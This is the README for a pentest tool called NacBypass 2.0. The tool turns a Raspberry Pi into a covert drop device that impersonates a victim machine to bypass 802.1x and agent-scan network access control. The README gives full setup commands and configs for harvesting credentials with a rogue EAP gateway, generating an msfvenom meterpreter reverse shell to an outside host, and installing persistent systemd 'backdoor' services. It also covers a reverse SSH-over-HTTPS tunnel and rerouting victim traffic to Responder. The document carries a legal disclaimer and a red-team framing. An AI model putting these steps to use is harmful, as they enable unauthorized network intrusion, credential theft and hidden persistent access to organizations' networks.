# NacBypass 2.0

**This device should bypass the two most common types of network access control: <= 802.1x-2004 and security baseline/agent scan NAC. Because the meat of the script is designed to assume the identity of the victim by injecting packets into the traffic traversing the transparent bridge, any NAC solution that utilizes IPSEC or MACSEC to encrypt traffic will not be vulnerable to this bypass technique.**

**A NAC solution doesn’t need to be employed on the target site for this script to work, it will work as a MITM device regardless**

## Legal Disclaimer

Usage of this script and drop-pi for attacking targets without prior mutual consent is illegal. This is only for educational or testing purposes and can only be used where strict consent has been given. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational or testing purposes.

## Special Thanks

I want to thank the entire team at [Focal Point Data Risk](https://focal-point.com/) for giving me the opportunity to research, develop, and test this device and subsequent applications that make up the Drop-Pi as a whole. Without their support and guidance, this idea would have never been possible. Thank you!!!

## What is it?

NacBypass2.0 was built to run on a low profile device, such as a Raspberry Pi, with little to no manual intervention needed - just plug-in and go. The basic premise of this device is to sit in between the victim machine and a network switch or wall port, pass the required traffic for NAC/802.1x authentication, and impersonate the victim machine. Once authentication has happened, the appropriate iptables and ebtables rules are constructed to 1.) assume the identity of the victim machine and 2) subsequently pass the appropriate traffic to either the victim machine or this bypass device. Because of this setup, you are able to access and attack the target network, while impersonating the victim machine. In addition, some form of remote access is required on your part - examples include a meterpreter reverse shell or VPN client running on the Pi. Once the bridge and bypass setup is complete, the remote access of your choice will be able to communicate out and establish a connection.

The automated setup relies on determining if an ethernet jack has been plugged into onboard NIC (eth0). In the event an ethernet jack has been plugged in, the NacBypass script with initiate. When removed, the deconstruction process begins on the bridge and bypass entities. As it is setup, it's important that you don't connect the onboard NIC before the USB NIC has been connected. Additionally, if you plug in both the ethernet connections (USB and onboard NIC) before supplying power to the Pi, it will work. However, there may be a longer delay depending on the startup time of your Raspberry Pi.

NEW: eaphammer/hostapd-wpe integration for harvesting creds. If enabled, when an EAP start packet in detected during the initial setup process, the script will kick off a rogue gateway and trick the victim into authentication and stealing their credzzzz. This is the same attack type as WPA-EAP, so nothing really new and pitfalls are the same.

### Features Include:
  - Auto init script when onboard Ethernet jack is connected.
  - (Raspberry Pi specific) Onboard led light status indicator when bypass setup is successful.
  - Persistent reverse shell/backdoor setup for remote access.
  - SSH redirect for direct access.
  - Built on kali linux, 'cause they said so
  - Hostapd for stealing creds
  - Magic.

### Requirements
  - USB NIC
  - tcpdump
  - bridge-utils
  - ebtables
  - iptables
  - ifplugd
  - net-tools
  - macchanger
  - eaphammer or hostapd-wpe
  - a can-do attitude

### Support OSes
Kali Linux
Ubuntu 

### iptables for Kali only
In setting this up on Kali (2019.3 ARM) the iptables-nrf and ebtables-nrf alternatives are used by default. You *must* update these to use the legacy versions.

```sh
root@kali:/opt# update-alternatives --list iptables
 /usr/sbin/iptables-legacy
 /usr/sbin/iptables-nft

root@kali:/opt# update-alternatives --set iptables /usr/sbin/iptables-legacy

root@kali:/opt# update-alternatives --list ebtables
 /usr/sbin/ebtables-legacy
 /usr/sbin/ebtables-nft

root@kali:/opt# update-alternatives --set ebtables /usr/sbin/ebtables-legacy
```

### Basic diagram - important connection steps

1. Supply Power to Raspberry Pi
2. Eth1 (USB NIC) ---> Connects to switch/wall port
3. Eth0 (onboard NIC) --> Connects to connects to victim pc
4. Script initiates automatically

-or-

1. Eth1 (USB NIC) ---> Connects to switch/wall port
2. Eth0 (onboard NIC) --> Connects to victim pc
3. Supply power to Raspberry Pi
4. Script initiates automatically

*** These items can all be edited in the script and config files. Just be consistent.

## Installation

NacBypass.sh is self-contained and handles everything needed to bridge traffic and bypass NAC/802.1x. To run manually, after plugging in the correct ethernet cables:
```sh
$ ./NacBypass.sh up
$ ./NacBypass.sh down
```
To make it an automated process with no intervention needed, a couple things need to be in place before you run into a building, plug it in, and laugh methodically.

##### 1.) Disable DHCP on the onboard NIC (eth0)
Within /etc/network/, edit the interfaces file accordingly - no other settings should be present after editing:

```sh

allow-hotplug eth0
	iface eth0 inet manual
	up ifconfig eth0 up
	pre-up /opt/Drop-Pi/NacBypass2.0/pre-up.sh
	pre-down /opt/Drop-Pi/NacBypass2.0/NacBypass.sh down
allow-hotplug eth1
	iface eth1 inet dhcp
	up ifconfig eth1 up
```
This allows the NIC to remain active, but not seek an IP address. This would ruin everything, and you would just go home crying. Also, this sets the stage for ifplugd to monitor the status of the NIC. Two separate config files are needed to ensure ifplugd with monitor and act appropriately on the correct NIC.



##### 2.) ifplugd setup
Ifplugd is used to monitor the state of the onboard NIC, and executing specific actions when either the NIC is connected or disconnected.

ifplug.conf should have the following set:

```sh
INTERFACES="eth0"
HOTPLUG_INTERFACES=""
ARGS="-a -r /etc/ifplugd/ifplugd.action"
SUSPEND_ACTION="stop"
```

On kali (ARM 2019.3), this file is at vim /etc/default/ifplugd

With kali, ifplugd.action runs all the scripts within /etc/ifplugd/action.d. Add the "nacif" file into the action.d directory, and remove the other scripts in the directory. nacif will determine what to do when the NIC is connected, and should look like:

```sh
#!/bin/bash

case "$2" in
  up)
    if [ "$1" = "eth0" ]; then
      exec /opt/NacBypass2.0/NacBypass.sh up
    fi
  ;;
  down)
    if [ "$1" = "eth0" ]; then
      exec /opt/NacBypass2.0/NacBypass.sh check_up
    fi
  ;;
esac
```
As you can see, once a connection is seen by ifplugd, it will execute the NacBypass.sh script. Subsequently, once the NIC is disconnected it will begin the deconstruction process. Finally, start and enable the ifplugd service.

```sh
$ systemctl start ifplugd
$ systemctl enable ifplugd
```

##### 3.) Persistent Remote Access - Meterpeter Reverse Shell

You can use anything here, this step just outlines setting up a persistent reverse shell via systemd.

Here is an example for a meterpreter on kali (2019.3 ARM)

```sh
msfvenom --payload linux/aarch64/meterpreter_reverse_https LHOST=1.2.3.4 LPORT=443 --format elf --out /opt/NacBypass2.0/backdoor
chmod +x /opt/NacBypass2.0/backdoor
```

Once you construct a payload via msfvenon, or whatever else you kids use these days, and downloaded it to the Raspberry Pi, create the following systemd file "backdoor.service" (/etc/systemd/system/backdoor.service):

```sh
[Unit]
Description=Meterpreter Backdoor
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
PIDFile=/var/run/backdoor.pid
Restart=always
RemainAfterExit=no
RestartSec=1
WorkingDirectory=/opt/NacBypass2.0
ExecStart=/opt/NacBypass2.0/backdoor

[Install]
WantedBy=multi-user.target
```
Once created, reload the daemon

```sh
$ systemctl daemon-reload
```
Enable the service

```sh
$ systemctl enable backdoor.service
```
Start the service now or wait till a reboot starts it, your call...
To start the service:
```sh
$ systemctl start backdoor.service
````
To wait:
```sh
$
```
##### 4) Persistent Remote Access - Reverse SSH over HTTPS Tunnel

This is a fun reverse shell that will give you SSH access to the planted Raspberry Pi.

You'll want to make sure your server, AWS or whatever, has a new basic user created with an ssh key you are ok with getting burned - DO NOT USE THE ROOT USER AND KEY FOR THIS, just don't.
On the Raspberry Pi, edit your ssh config file:

```sh
Host <IP or Domain Name of Server>
  Hostname 1.2.3.4
  ProtocolKeepAlives 30
  User <New basic user your created>
  IdentityFile <path to ssh key for new user, that is stored on Pi>
  ProxyCommand proxytunnel -q -E -p <IP or Domain Name of Server>:443 -d <IP or Domain Name of Server>:22 -H "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)"
  Port 443
```
This config file tells SSH to create an HTTPS tunnel out to our remote server, then tunnel the SSH sesstion through that.

On the remote server, ensure apache is installed and the following config is enabled:
***Also ensure iptables is on, and only allowing the target network to connect.***

```sh
#
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
LoadModule proxy_http_module modules/mod_proxy_http.so
LoadModule proxy_connect_module modules/mod_proxy_connect.so

<VirtualHost *:443>

  ServerName mywebserver:443
  ServerAdmin admin@example.com

  SSLEngine on
  SSLCertificateFile "/etc/apache2/ssl/mysitename.crt"
  SSLCertificateKeyFile "/etc/apache2/ssl/mysitename.key"
  ## Only ever allow incoming HTTP CONNECT requests.
  ## Explicitly deny other request types like GET, POST, etc.
  ## This tells Apache to return a 403 Forbidden if this virtual
  ## host receives anything other than an HTTP CONNECT.
  RewriteEngine On
  RewriteCond %{REQUEST_METHOD} !^CONNECT [NC]
  RewriteRule ^/(.*)$ - [F,L]

  ## Setup proxying between youwebserver:8443 and yoursshserver:22

  ProxyRequests On
  ProxyBadHeader Ignore
  ProxyVia Full

  ## IMPORTANT: The AllowCONNECT directive specifies a list
  ## of port numbers to which the proxy CONNECT method may
  ## connect.  For security, only allow CONNECT requests
  ## bound for port 22.
  AllowCONNECT 22

  ## IMPORTANT: By default, deny everyone.  If you don't do this
  ## others will be able to connect to port 22 on any host.
  <Proxy *>
    Order deny,allow
    Deny from all
  </Proxy>

  ## Now, only allow CONNECT requests bound for our server
  ## Should be replaced with an ip or the hostname
  ## of whatever SSH server you're trying to connect to. Note
  ## that ProxyMatch takes a regular expression, so you can do
  ## things like (1\.2\.3\.4|anotherserver\.com) if you want
  ## to allow connections to multiple destinations.
  <ProxyMatch (1\.2\.3\.4|127\.0\.0\.1)>
    Order allow,deny
    Allow from all
  </ProxyMatch>

  ## Logging, always a good idea.
  LogLevel warn
  ErrorLog logs/yourwebserver-proxy_error_log
  CustomLog logs/yourwebserver-proxy_request_log combined

</VirtualHost>
```
The above config file will create the listener on apache, allowing an HTTPS tunnel to be established and SSH to passed through only to itself - look at the ProxyMatch section.

Back to working on the Raspberry Pi:
Next, create the following service file titled "backdoor@.service":

```sh
[Unit]
Description=Setup a remote secure tunnel to %I
After=network.target

[Service]
Environment="LOCAL_ADDR=localhost"
EnvironmentFile=/opt/NacBypass2.0/backdoor@%i
ExecStart=/usr/bin/ssh -NT -o ServerAliveInterval=60 -o ServerAliveCountMax=2 -o ExitOnForwardFailure=yes -R ${LOCAL_PORT}:localhost:${REMOTE_PORT} ${TARGET}
RestartSec=5
Restart=always

[Install]
WantedBy=multi-user.target
```
A couple things to note, the "ServerAliveInterval" parameter will send a null packet every 60 seconds over the SSH session to keep it alive. This way the session never dies due to a inactivity timeout. Additionally, the "ServerAliveCountMax" parameter Sets the number of server alive messages which may be sent without the client receiving any messages back from the server. When the threshold is reached, the session is killed. Luckly for us, the service file is set to always restart the ssh session.
The "EnvironmentFile" parameter is important here, it specifies the details for constructing the SSH session specific in the "ExecStart" parameter. As the path is appened is an "%i", a service is enabled and started for every remote host you desire. For example, we start the backdoor server that we want to communicate to an external machine (AWS, DigitalOcean, etc), where 1.2.3.4 is our extrenal machine:

```sh
systemctl enable backdoor@1.2.3.4
systemctl start backdoor@1.2.3.4
```
And the subsequent environment file, titled "backdoor@1.2.3.4", looks like:

```sh
TARGET=1.2.3.4
LOCAL_PORT=19999
REMOTE_PORT=22
```

When systemctl starts the specific backdoor service, it will utilize the ssh config file and the environment file to create and HTTPS tunnel to your external machine, then tunnel a reverse SSH session through the HTTPS tunnel.
At this point, SSH access to the Raspberry Pi can be achieved by running the following command on the external machine:

```sh
ssh user@127.0.0.1 -p 19999
```

##### 5) Running tools locally.
There comes a time where you may want to run tools locally on the Pi. There is an issue with running tools locally that don't create states within iptables - such as responder. Because the Pi assumes the IP of the victim PC, any traffic that doesn't have a state associated with it will most likely be routed over the bridge and to the victim PC. For example, if you are using responder, all poisoned requests wont make it back to responder, instead they are routed to the victim PC. To get around this issue, we need to create prerouting rules in iptables for all the ports we want to be routed to the Pi, regardless of state. Keep in mind, this will prevent legitimate traffic on any prerouted port from reaching the victim PC...if that's a bid deal for you. In order to speed up the process of creating and tearing down the appropriate iptables rules, the accompanying script has been created for your pleasure:

```sh
./create_fw_rules.py -h
usage: create_fw_rules.py [-h] -t {custom,responder} -cip COMPIP
                          [-bip BRIDGEIP] [-bint BRINT] [-p PORT [PORT ...]]
                          -a {up,down}

Create firewall rules for local tools. Prerouting rules to take traffic from
bridge and send it to Pi. Example: ./create_fw_rules.py -t custom -cip
10.0.1.1 -bip 169.254.66.66 -bint br0 -p 80 443 2233 -a up

optional arguments:
  -h, --help            show this help message and exit
  -t {custom,responder}, --type {custom,responder}
                        Specifc tools to build firewall rules for, or create
                        custom rules
  -cip COMPIP, --compIP COMPIP
                        IP address of Pi and victim machine. HINT: They are
                        the same.
  -bip BRIDGEIP, --bridgeIP BRIDGEIP
                        IP address of bridge
  -bint BRINT, --brint BRINT
                        Bridge interface
  -p PORT [PORT ...], --port PORT [PORT ...]
                        List of ports to create firwall rules for, can be one
                        or more ports: -p 80 443 8443
  -a {up,down}, --action {up,down}
                        Create or tear down specific rule sets
```

To create rules specific to responder, run:

```sh
./create_fw_rules.py -t responder -cip 172.26.1.122 -bint br0 -a up
```

Or to create custom prerouting rules, run:

```sh
./create_fw_rules.py -t custom -cip 172.26.1.122 -bint br0 -p 80 443 2547 -a up
```

Finally, destroying rules is as simple as:

```sh
./create_fw_rules.py -t responder -cip 172.26.1.122 -bint br0 -a down

--or--

./create_fw_rules.py -t custom -cip 172.26.1.122 -bint br0 -p 80 443 2547 -a down
```

##### 6) Routing your beacon over WLAN0

If you are running Ubuntu or any Linux os that uses Network Manager for Wifi you have to ensure the service is disabled before the system comes up or your WLAN0 will have the default routes and it will crush your br0.

In order to accomplish this you need to update your /etc/network/interfaces to have a pre-up and pre-down command script to disable the service.  I will look something like this.

pre-up.sh

```sh
#!/bin/bash

ifconfig wlan0 down
systemctl disable NetworkManager
systemctl stop NetworkManager

```



##### 6) That's it, I think. Probably forgot something.


### TO DO:
  - Robust error checking
  - Other things


## References and Credits
  - A lot of stuff in the 802.1x bypass script bits was built from this initil script: https://github.com/p292/NACKered
  - The SSH over HTTPS proxy, check out Mark Kolich's work on it here: https://github.com/markkolich/blog/blob/master/content/entries/configuring-apache-to-support-ssh-through-an-http-web-proxy-with-proxytunnel.md
  - [Focal Point Data Risk](https://focal-point.com/) - Check them out, just do it. Why are you still here, follow the link already!
